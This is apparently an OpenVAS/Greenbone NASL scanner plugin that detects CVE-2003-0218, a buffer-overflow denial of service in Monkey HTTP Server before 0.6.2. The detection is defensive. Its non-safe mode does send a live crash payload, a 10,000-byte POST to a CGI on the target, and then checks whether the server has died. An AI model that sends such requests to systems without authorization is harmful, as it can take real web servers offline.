# SPDX-FileCopyrightText: 2003 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11544");
  script_version("2024-05-24T19:38:34+0000");
  script_cve_id("CVE-2003-0218");
  script_tag(name:"last_modification", value:"2024-05-24 19:38:34 +0000 (Fri, 24 May 2024)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Monkey HTTP Server < 0.6.2 DoS Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2003 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 2001);
  script_mandatory_keys("Monkey/banner");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210121160200/http://www.securityfocus.com/bid/7202/");

  script_tag(name:"summary", value:"Monkey HTTP Server is prone to a denial of service (DoS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Depending on the 'safe_checks' setting of the scan
  configuration:

  - Setting 'yes': Checks if a vulnerable version is present on the target host

  - Setting 'no': Sends a crafted HTTP POST request and checks if the system is still responding
  afterwards");

  script_tag(name:"insight", value:"The product crashes when it receives a POST command with too
  much data due to a buffer overflow.

  It *may* even be possible to make this web server execute arbitrary code with this attack.");

  script_tag(name:"impact", value:"It is possible to make this web server crash or execute arbitrary
  code.");

  script_tag(name:"affected", value:"Monkey HTTP Server versions prior to 0.6.2.");

  script_tag(name:"solution", value:"Update to version 0.6.2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("version_func.inc");

port = http_get_port(default:2001);
banner = http_get_remote_headers(port:port);

if(!banner || banner !~ "Server\s*:\s*Monkey")
  exit(0);

if(safe_checks()) {
  if(banner =~ "Server\s*:\s*Monkey/0\.([0-5]\.|6\.[01])") {
    report = report_fixed_ver(installed_version:"See server banner", fixed_version:"0.6.2");
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

if(http_is_dead(port:port))
  exit(0);

l = http_get_kb_cgis(port:port, host:"*");
if(isnull(l)) {
  script = "/";
} else {
  # Let's take a random CGI.
  n = rand() % max_index(l);
  script = ereg_replace(string:l[n], pattern:" - .*", replace:"");
  if(!script)
    script = "/"; # Just in case the KB is corrupted
}

if(!soc = http_open_socket(port))
  exit(0);

req = http_post(item:script, port:port, data:crap(10000));

if("Content-Type:" >!< req)
  req = ereg_replace(string:req, pattern:"Content-Length\s*:", replace:'Content-Type: application/x-www-form-urlencoded\r\nContent-Length:');

send(socket:soc, data:req);
http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port:port, report:"The HTTP server is not responding anymore after receiving our crafted HTTP request.");
  set_kb_item(name:"www/too_big_post_crash", value:TRUE);
  exit(0);
}

exit(99);
